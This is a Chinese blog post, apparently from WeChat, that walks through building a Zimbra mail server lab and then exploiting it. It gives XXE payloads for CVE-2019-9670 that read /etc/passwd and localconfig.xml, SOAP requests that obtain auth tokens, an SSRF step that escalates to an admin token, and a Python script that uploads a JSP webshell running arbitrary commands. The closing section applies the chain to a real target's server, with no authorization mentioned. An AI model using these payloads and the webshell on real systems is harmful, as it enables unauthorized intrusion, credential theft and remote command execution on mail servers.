\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/AkfmAWyfGyO5J1crDVajEQ)

**前言**  

近期在测试一个目标的时候发现对方好几个 zimbra 的服务器，按照网上提供的利用方法测试了之后发现利用不成功！接着自己搭建了 zimbra 在自己进行测试之后成功利用并且拿下 zimbra 服务器！

zimbra 环境搭建

搭建的方法我是按照网上帖子搭建的！很不错！  

```
https://www.jianshu.com/p/722bc70ff426
```

环境搭建首先需要一个 ubuntu 的系统，并且更新好源，接着就安装辅助包！

配置

```
Ubuntu14.04-64位
root权限
磁盘剩余空间25G
RAM 4G
```

实现步骤

```
安装辅助包
配置hostname和DNS服务器
下载和安装Zimbra
测试安装
```

安装辅助包

链接服务器，并执行以下命令来安装相应的包

```
apt-get install libgmp10 libperl5.18 unzip pax sysstat sqlite3 dnsmasq wget
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxerVRppvySVM6wjCNd520wnz5kNHghb8ElRajBibMSmHbyGOenzs5o7Q/640?wx_fmt=png)

配置 hostname 和 DNS 服务器

```
vi /etc/hostname
更改hostname为自己的域名，例如mail.test.com

vi /etc/hosts 添加如下代码
172.16.25.242(本机IP) mail.test.com mail
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxaPs7ZVTf70zaKwRBDFQF1NNomwHeM8c3BdLj3kOIjnEQA0x4Z1566Q/640?wx_fmt=png)

**编辑 dnsmasq 的配置**

```
vim /etc/dnsmasq.conf


server=172.16.25.242
domain=test.com
mx-host=test.com, mail.test.com, 5
mx-host=mail.test.com, mail.test.com, 5
listen-address=127.0.0.1
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxbZXfb3Ej0ZWibgxwAmaDfwPzNrcicfuxDB7F2FJTk4kADK9nKxYb1G5Q/640?wx_fmt=png)

安装 Zimbra

第一步 下载并解压文件，执行如下命令来下载文件

```
wget https://files.zimbra.com/downloads/8.6.0\_GA/zcs-8.6.0\_GA\_1153.UBUNTU14\_64.20141215151116.tgz
```

执行如下命令来解压文件

```
tar -xvf zcs-8.6.0\_GA\_1153.UBUNTU14\_64.20141215151116.tgz
```

然后进入此文件，如果接下来安装的时候遇到这个问题，就需要单独安装一个依赖才行！

```
wget http://th.archive.ubuntu.com/ubuntu/pool/universe/g/gmp4/libgmp3c2\_4.3.2+dfsg-2ubuntu1\_amd64.deb

dpkg -i libgmp3c2\_4.3.2+dfsg-2ubuntu1\_amd64.deb
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxqx8OFkCX04WUQTvKKdwuWxib10e1TXqHbQrLEnoLqlISEDeh0k7ibT8A/640?wx_fmt=png)

第二步 安装

执行以下文件来安装

```
sudo ./install.sh
```

在这个过这个过程中会出现这样的选择，接着输入 “y”，然后继续。遇到以下情况应该这样选择

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxynFlzF18G5gVBZpFwnEaOPNeA9abj6RFlH03rC2nqUb78XHTdvsmyw/640?wx_fmt=png)

这里不需要 zimbra-dnscache，因为我们上边使用的是 dnsmasq，所以不需要此包你需要等一会，因为安装这些包是需要一些时间的。

下一步是配置 Zimbra-store 的管理员账号密码，看如下代码：

```
Main menu

   1) Common Configuration:                                                  
   2) zimbra-ldap:                             Enabled                       
   3) zimbra-logger:                           Enabled                       
   4) zimbra-snmp:                             Enabled           
   5) zimbra-mta:                              Enabled            
   6) zimbra-store:                            Enabled                       
   ..............
   6) zimbra-spell:                            Enabled                       
   7) zimbra-proxy:                            Enabled                       
   8) Default Class of Service Configuration:                                
   s) Save config to file                                                    
   x) Expand menu                                                            
   q) Quit                                    

Address unconfigured (\*\*) items  (? - help) 6
```

选择 “6”，然后会出现

```
Store configuration

   1) Status:                                  Enabled                       
   2) Create Admin User:                       yes                           
   3) Admin user to create:                    admin@mail.test.local     
  .....                       
  24) Install UI (zimbra,zimbraAdmin webapps): yes 
  
Select, or 'r' for previous menu \[r\] 4
```

选择 “4”，然后输入密码即可，之后的操作如下：

```
Main menu

   1) Common Configuration:                                                  
   .......                                                      
   q) Quit                                    

\*\*\* CONFIGURATION COMPLETE - press 'a' to apply
Select from menu, or press 'a' to apply config (? - help) a
Save configuration data to a file? \[Yes\] yes
Save config in file: \[/opt/zimbra/config.11647\] 
Saving config in /opt/zimbra/config.11647...done.
The system will be modified - continue? \[No\] yes
```

最后，你需要等待 Zimbra 配置完成。使用 su - zimbra 命令切换用户，zmcontrol status 查看 zimbra 服务器状态

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxVmC2W5rphxyvbmVS42YXFhibIuOZSQkkG7NY1gmgCLeQq5ogdO5UsEQ/640?wx_fmt=png)

接着访问 访问 IP:7071 端口，跳转 zimbra 管理页面 ，注意这个是需要使用 HTTPS 协议来访问

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxNvH79UAqdreNa06YuBzS6WcSiblPHPQs1uwe5pgBnQyq85gZiaaIIkGg/640?wx_fmt=png)

zimbra RCE 漏洞靶机复现

Zimbra 的配置文件是在 **/conf/localconfig.xml** 这个文件里面的！里面有保存到一些配置信息的用户名和密码！

首先的话需要先验证是否有 CVE-2019-9670 XXE 漏洞，接着抓取到它的数据包，这里需要带入 cookie 的数据包，发到重放中之后修改为 POST 模式来进行数据发送，接着 URL 修改为 **/Autodiscover/Autodiscover.xml** 。并且修改 **Content-Type: application/xml**。接着带入 XML 的 POC

```
<!DOCTYPE xxe \[
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >\]>
 <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
      <EMailAddress>aaaaa</EMailAddress>
      <AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
    </Request>
  </Autodiscover>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKx0tCxWmknNiavUgxnXFAhA3F7kCT3OY3ico64cky6TzjRPZg6xNLe5znQ/640?wx_fmt=png)

读取到了 /etc/passwd 文件代表了具有 CVE-2019-9670 XXE 漏洞。接着需要构造 payload 来读取 zimbra 的配文件 localconfig.xml。由于 localconfig.xml 为 XML 文件，需要加上 CDATA 标签才能作为文本读取，由于 XXE 不能内部实体进行拼接，所以此处需要使用外部 dtd。dtd 内容：

```
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<!\[CDATA\[">
<!ENTITY % end "\]\]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

接着再次使用刚刚的包请求 XML 来进行 XXE 攻击。

```
<!DOCTYPE Autodiscover \[
        <!ENTITY % dtd SYSTEM "http://地址/dtd">
        %dtd;
        %all;
        \]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <Request>
        <EMailAddress>aaaaa</EMailAddress>
        <AcceptableResponseSchema>&fileContents;</AcceptableResponseSchema>
    </Request>
</Autodiscover>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxeeaiaCY1UTHfjB67O7X2s3Gic8QZBkHSiaU9gg1zq7mN6LzIUtjv9NU8w/640?wx_fmt=png)

利用已经得到的密码获取低权限的 token，低权限的 token 可以通过 soap 接口发送 AuthRequest 进行获取。访问到  /service/soap 或 / service/admin/soap 接着进行 抓包并且修改为 POST 模式。还要修改 Content-Type: application/xml 。XML 的内容如下：

```
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
   <soap:Header>
       <context xmlns="urn:zimbra">
           <userAgent />
       </context>
   </soap:Header>
   <soap:Body>
     <AuthRequest xmlns="urn:zimbraAccount">
        <account by="adminName">zimbra</account>
        <password>上一步得到密码</password>
     </AuthRequest>
   </soap:Body>
</soap:Envelope>
```

接着发送数据包过去，这里他就返回回来一个低权限的 Token 了。这个 Token 需要保存，等下会用到。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxclJIO1LQ0BN4pRiaiabwhajKRy0z27OUWGpEPBQBf3fqCyTd6nHWa2Sw/640?wx_fmt=png)

拿到低权限的 Token 之后可以通过 SSRF 漏洞获取 proxy 接口，访问 admin 的 soap 接口来获取到高权限的 Token，访问 URL:/service/proxy?target=https://127.0.0.1:7071/service/admin/soap ，接着进行 抓包，获取到数据包之后修改 POST 模式。这一步需要把上一步获取到的低权限的 token 添加到 cookie 中，将 xmlns="urn:zimbraAccount" 修改为 xmlns="urn:zimbraAdmin"，并且需要在 Host 头中加入端口 7070，URL 中 SSRF 访问的 target 需要使用 https 协议。但是这里通过 SSRF 失败了，通过 / service/admin/soap 获取高权限 token

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxclJIO1LQ0BN4pRiaiabwhajKRy0z27OUWGpEPBQBf3fqCyTd6nHWa2Sw/640?wx_fmt=png)

还有一种情况！一开始我按照公开提供的 SSRF 利用手法！在获取高权限 token 的时候，如果指定 cookie 的等级为 ZM\_AUTH\_TOKEN 的时候会验证失败 ，出现如下的效果！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxG3hOZX8mibiab3ETUv683RRibBiaR2wtSSRgpu7zDtd5ibp9icpCia6Je0lyg/640?wx_fmt=png)

但是如果把 cookie 的等级替换为 ZM\_ADMIN\_AUTH\_TOKEN 高权限的 TOKEN 的时候 就可以获取得到了！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxbbfurz2DkstxTH10Ko4iauGWLpLtTQCzfQx7ejacNmiapgxudfRnQu4A/640?wx_fmt=png)

接着利用刚刚获取到的高权限的 TOKEN 来进行文件上传，把 webshell 上传上去！

```
import requests

file= {
'filename1':(None,"whocare",None),
'clientFile':("ss.jsp",r'<%if("023".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();int a = -1;byte\[\] b = new byte\[2048\];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>',"text/plain"), 
'requestId':(None,"12",None),
}
headers ={ 
"Cookie":"ZM\_ADMIN\_AUTH\_TOKEN=0\_65ae5d9b75c34c538cd72a658f7de7d32a9ec7f9\_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313630353233373838313432323b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d31303a313832383739333130393b;",#改成自己的admin\_token
"Host":"foo:7071"
}
r=requests.post("https://192.168.8.155:7071/service/extension/clientUploader/upload",files=file,headers=headers,verify=False)    
print(r.text)
```

接着访问到这个 webshell，这个 webshell 需要有高权限的 Cookie 才可以访问得到这个 webshell!

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxtHoExxVb2vdrLr27keQicHR99E0PdLsWXuEicJyBKAMwxXJlR3YDtSSQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxR5E588NBAfeNJVOuQLxq9pDqoAtZe3C8Pg5tnTQ8NO5kscoDmE0gnA/640?wx_fmt=png)

实战 zimbra RCE

复现这个漏洞主要就是遇到了这个邮箱服务器！并且存在 XXE 读取文件！前面的准备都是为了这一刻！！！！！

首先获取它的数据包，利用了 CVE-2019-9670 XXE 漏洞来读取配置文件。Zimbra 配置文件位置为 / conf/localconfig.xml。接着抓取到它的数据包，这里需要带入 cookie 的数据包。接着放到重放去，修改请求方式为 POST，并且带入 URL :/Autodiscover/Autodiscover.xml 。并且修改 Content-Type: application/xml。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKx4XhWHgianE70PiaYB6PiaCickyfoCLCRSoaz14pN9poJMN5vFKj1XCHX8Q/640?wx_fmt=png)

这里已经成功的读取到了用户的信息。说明 XXE 攻击成功了！接着需要构造 payload 来读取 zimbra 的配文件 localconfig.xml。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxaKwmGJjtfO8zL5xVduu4CDnbn0bg3cErRqNfaEXTJiasDtMHPrj6v9Q/640?wx_fmt=png)

利用已经得到的密码获取低权限的 token，低权限的 token 可以通过 soap 接口发送 AuthRequest 进行获取。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxUZVYZVKt8N72o5Rg1EtWkhlCWxXDRsiaIDOeZNaZkP68CsJaXWKiczxQ/640?wx_fmt=png)

拿到低权限的 Token 之后可以通过 SSRF 漏洞获取 proxy 接口，访问 admin 的 soap 接口来获取到高权限的 Token，访问 URL:/service/proxy?target=https://127.0.0.1:7071/service/admin/soap ，接着进行 抓包，获取到数据包之后修改 POST 模式。这一步需要把上一步获取到的低权限的 token 添加到 cookie 中，将 xmlns="urn:zimbraAccount" 修改为 xmlns="urn:zimbraAdmin"，并且需要在 Host 头中加入端口 7070，URL 中 SSRF 访问的 target 需要使用 https 协议，并且 COOKIE 需要更换为  ZM\_ADMIN\_AUTH\_TOKEN 带上刚刚获取的 COOKIE。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxpMQg7gud7nDrd0OVgBEsG5T0pMkVw22yvsqf0EEzz2nSzDCibC2r7IQ/640?wx_fmt=png)

接着通过 python 脚本来上传到对方的服务器中！一开始访问这个木马地址是需要高权限的 COOKIE 才行的！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKx4ph2zbUvQJaTwBFdRJbjVV0HkCCuibactrQ5RvxtYACsxFyQkUzQCkQ/640?wx_fmt=png)

成功了！哈哈哈哈哈哈哈  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDBOI1SSibo2QR6gzdt9XBGKxMBMcRRykW9afYuPibvuF5zHiaZIVB4BdTBMs7zqdXqavYXXdNVD2rTGQ/640?wx_fmt=png)